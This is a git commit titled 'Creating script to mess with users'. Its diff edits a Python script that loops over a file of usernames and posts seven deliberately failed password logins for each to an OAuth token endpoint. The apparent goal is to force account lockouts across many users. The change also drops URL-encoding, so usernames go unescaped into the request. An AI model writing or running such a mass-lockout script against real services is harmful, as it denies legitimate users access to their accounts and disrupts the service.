d1481c51f6f4d4a082893de677631524cfc6c49a
Thiago Fonseca <dev.thiago@gmail.com>
2023-07-24 19:06:11 -0300

    Creating script to mess with users

--- disturb_account/main.py
+++ disturb_account/main.py
@@ -1,6 +1,5 @@
 import os
 import requests
-import urllib
 
 AUTH_HOST = os.environ["AUTH_HOST"]
 
@@ -9,11 +8,10 @@ users_lines = users_file.readlines()
 
 for username in users_lines:
     username = username.replace('\n', '')
-    username = urllib.parse.quote(username)
-    print(f"\nUsername: {username}")
+    print("\nUsername: " + username)
 
     for attempt in range(7):
-        print(f"Attempt: {attempt + 1}")
-        url = f"{AUTH_HOST}/oauth/token?grant_type=password&username={username}&password=invalid_password"
+        print("Attempt: " + str(attempt + 1))
+        url = AUTH_HOST + "/oauth/token?grant_type=password&username=" + username + "&password=invalid_password"
 
         requests.post(url)
